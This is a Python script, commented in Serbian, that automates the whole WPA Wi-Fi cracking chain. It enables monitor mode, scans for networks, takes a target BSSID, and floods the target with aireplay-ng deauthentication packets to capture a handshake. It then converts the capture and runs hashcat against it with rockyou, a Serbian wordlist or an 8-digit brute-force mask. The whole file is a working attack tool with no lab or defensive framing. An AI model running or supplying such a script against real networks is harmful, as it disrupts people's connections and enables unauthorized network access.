import subprocess
import os
import sys
import glob
import time

def run_command(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def get_interfaces():
    result = run_command("iw dev | grep Interface | awk '{print $2}'")
    interfaces = [i for i in result.stdout.strip().split('\n') if i]
    return interfaces

def cleanup(interface):
    print("\n[!] Čišćenje sistema i vraćanje Wi-Fi funkcije...")
    run_command("pkill aireplay-ng")
    run_command(f"airmon-ng stop {interface}")
    run_command("systemctl restart NetworkManager")
    # Brisanje privremenih airodump fajlova
    for f in glob.glob("temp_capture*"):
        if not f.endswith(".22000"): # Ne brišemo finalni hash
            try: os.remove(f)
            except: pass
    print("[+] Mreža restartovana.")

def pokreni_hashcat(fajl_22000):
    print("\n" + "="*30)
    print("   HASHCAT MENI ZA PROBIJANJE")
    print("="*30)
    print("1) srpski.txt")
    print("2) rockyou.txt")
    print("3) 8 brojeva (0-9 brute-force)")
    print("4) Izlaz")
    
    izbor = input("\nIzaberi opciju (1-4): ")

    # --- OVDE PROVERI PUTANJE DO SVOJIH WORDLISTI ---
    putanja_srpski = "srpski.txt" # Ako je u istom folderu
    putanja_rockyou = "/usr/share/wordlists/rockyou.txt"

    if izbor == '1':
        print(f"[!] Pokrećem: srpski.txt...")
        subprocess.run(f"hashcat -m 22000 {fajl_22000} {putanja_srpski}", shell=True)
    elif izbor == '2':
        print(f"[!] Pokrećem: rockyou.txt...")
        subprocess.run(f"hashcat -m 22000 {fajl_22000} {putanja_rockyou}", shell=True)
    elif izbor == '3':
        print(f"[!] Pokrećem napad na 8 brojeva (maska)...")
        subprocess.run(f"hashcat -m 22000 -a 3 {fajl_22000} ?d?d?d?d?d?d?d?d", shell=True)
    else:
        print("[+] Završeno bez crack-ovanja.")

def main():
    if os.geteuid() != 0:
        print("[-] Greška: Moraš pokrenuti skriptu sa SUDO.")
        sys.exit()

    # 1. Odabir kartice
    ifaces = get_interfaces()
    if not ifaces:
        print("[-] Kartica nije pronađena.")
        return

    if len(ifaces) == 1:
        iface = ifaces[0]
        print(f"[+] Automatski odabrana kartica: {iface}")
    else:
        for i, name in enumerate(ifaces):
            print(f"{i}) {name}")
        iface = ifaces[int(input("Odaberi broj kartice: "))]

    # 2. Priprema monitor moda
    print("[+] Gasim procese koji smetaju...")
    run_command("airmon-ng check kill")
    print(f"[+] Palim monitor mode na {iface}...")
    run_command(f"airmon-ng start {iface}")
    
    # Prepoznavanje imena monitor interfejsa (wlan0 -> wlan0mon)
    monitor_iface = iface if "mon" in iface else iface + "mon"

    # 3. Skeniranje okoline
    print("\n[!] SKENIRANJE U TOKU. Pritisni CTRL+C kada vidiš metu...")
    try:
        subprocess.run(f"airodump-ng {monitor_iface}", shell=True)
    except KeyboardInterrupt:
        pass

    # 4. Unos mete
    target_bssid = input("\nUnesi BSSID mete: ")
    target_channel = input("Unesi kanal: ")
    file_name = input("Unesi ime fajla (bez ekstenzije): ")

    # 5. Hvatanje Handshake-a + Deauth
    print(f"\n[!] Pokrećem hvatanje i DEAUTH napad. Čekaj 'WPA Handshake' gore desno.")
    print("[!] Pritisni CTRL+C čim vidiš da je handshake uhvaćen.")
    
    deauth_proc = subprocess.Popen(
        f"aireplay-ng --deauth 0 -a {target_bssid} {monitor_iface}", 
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    try:
        subprocess.run(f"airodump-ng -c {target_channel} --bssid {target_bssid} -w temp_capture {monitor_iface}", shell=True)
    except KeyboardInterrupt:
        pass
    finally:
        deauth_proc.terminate()

    # 6. Provera i konverzija
    cap_file = "temp_capture-01.cap"
    izlazni_22000 = f"{file_name}.22000"

    if os.path.exists(cap_file):
        check = run_command(f"aircrack-ng {cap_file}")
        if "1 handshake" in check.stdout:
            print("\n[+++] HANDSHAKE POTVRĐEN!")
            run_command(f"hcxpcapngtool -o {izlazni_22000} {cap_file}")
            print(f"[+] Kreiran fajl: {izlazni_22000}")
            
            # 7. Čišćenje pre Hashcat-a
            cleanup(monitor_iface)
            
            # 8. Meni za crack-ovanje
            pokreni_hashcat(izlazni_22000)
        else:
            print("\n[-] Handshake NIJE pronađen u .cap fajlu.")
            cleanup(monitor_iface)
    else:
        print("\n[-] Greška: .cap fajl nije napravljen.")
        cleanup(monitor_iface)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Skripta nasilno prekinuta.")
        sys.exit()
